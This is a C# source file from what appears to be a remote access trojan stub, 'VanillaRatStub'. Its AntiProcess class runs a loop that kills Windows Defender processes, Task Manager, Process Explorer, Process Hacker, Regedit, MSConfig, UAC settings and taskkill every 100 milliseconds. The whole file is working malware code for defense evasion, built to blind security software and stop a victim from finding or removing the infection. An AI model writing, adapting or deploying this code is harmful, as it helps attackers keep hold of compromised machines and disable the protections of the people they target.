using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Permissions;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace VanillaRatStub.InformationHelpers
{
    class AntiProcess
    {
        private static Thread BlockThread = new Thread(Block);    
        public static bool Enabled { get; set; }

        public static void StartBlock()
        {
            Enabled = true;
            BlockThread.Start();
        }

        [SecurityPermission(SecurityAction.Demand, ControlThread = true)]
        public static void StopBlock()
        {
            Enabled = false;
            try
            {
                BlockThread.Abort();
                BlockThread = new Thread(Block);
            } catch { }         
        }

        public static void Block()
        {
            while (Enabled)
            {
                foreach (Process P in Process.GetProcesses())
                {
                    try
                    {
                        string ProcessName = P.ProcessName;
                        if (ProcessName.Equals("Taskmgr") ||
                            ProcessName.Equals("ProcessHacker") ||
                            ProcessName.Equals("procexp") ||
                            ProcessName.Equals("MSASCui") ||
                            ProcessName.Equals("MsMpEng") ||
                            ProcessName.Equals("MpUXSrv") ||
                            ProcessName.Equals("MpCmdRun") ||
                            ProcessName.Equals("NisSrv") ||
                            ProcessName.Equals("ConfigSecurityPolicy") ||
                            ProcessName.Equals("MSConfig") ||
                            ProcessName.Equals("Regedit") ||
                            ProcessName.Equals("UserAccountControlSettings") ||
                            ProcessName.Equals("taskkill")
                        )
                        {
                            P.Kill();
                        }
                    } catch { }
                }
                Thread.Sleep(100);
            }
        }
    }
}
